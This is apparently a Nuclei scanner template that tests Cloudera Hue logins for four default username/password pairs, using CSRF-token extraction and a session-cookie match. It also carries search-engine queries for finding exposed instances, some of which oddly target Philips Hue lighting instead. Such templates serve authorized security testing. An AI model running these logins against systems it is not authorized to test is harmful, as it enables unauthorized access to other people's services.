id: hue-default-credential

info:
  name: Cloudera Hue Default Credentials
  author: For3stCo1d
  severity: high
  description: Cloudera Hue default login credentials were discovered.
  reference:
    - https://github.com/cloudera/hue
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:cloudera:hue:*:*:*:*:*:*:*:*
  metadata:
    max-request: 8
    vendor: cloudera
    product: hue
    shodan-query:
      - http.title:"hue - welcome to hue"
      - cpe:"cpe:2.3:h:philips:hue"
      - http.title:"hue personal wireless lighting"
    fofa-query: title="hue personal wireless lighting"
    google-query: intitle:"hue personal wireless lighting"
    runzero-match: any(each(service["html.titles"]), {# matches "Hue - Welcome to Hue"})
  tags: hue,default-login,oss,cloudera

http:
  - raw:
      - |
        GET /hue/accounts/login?next=/ HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /hue/accounts/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        csrfmiddlewaretoken={{csrfmiddlewaretoken}}&username={{user}}&password={{pass}}&next=%2F

    attack: pitchfork
    payloads:
      user:
        - admin
        - hue
        - hadoop
        - cloudera
      pass:
        - admin
        - hue
        - hadoop
        - cloudera

    extractors:
      - type: regex
        name: csrfmiddlewaretoken
        part: body
        internal: true
        group: 1
        regex:
          - name='csrfmiddlewaretoken' value='(.+?)'
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - contains(tolower(body_1), 'welcome to hue')
          - contains(tolower(header_2), 'csrftoken=')
          - contains(tolower(header_2), 'sessionid=')
        condition: and

      - type: status
        status:
          - 302

